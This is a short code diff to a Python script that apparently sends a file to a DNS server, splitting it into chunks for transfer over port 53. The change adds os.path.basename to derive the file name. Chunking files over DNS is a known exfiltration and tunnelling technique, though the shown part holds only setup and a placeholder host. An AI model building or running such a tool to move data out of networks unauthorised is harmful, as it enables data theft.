@@ -1,14 +1,15 @@
 import socket
 import base64
 import hashlib
+import os
 
 # DNS server domain name
 DNS_SERVER = "dnsserver.example.com"
 DNS_PORT = 53
 
 # File to send
-file_path = "path/to/your/file.pdf"
-file_name = "file.pdf"  # Name and extension of the file
+file_path = "path/to/your/file.pdf"  # Replace with the actual file path
+file_name = os.path.basename(file_path)  # Extracts the file name with extension
 
 def chunk_file(file_data, chunk_size=255):
     """Splits the file data into chunks of a given size."""
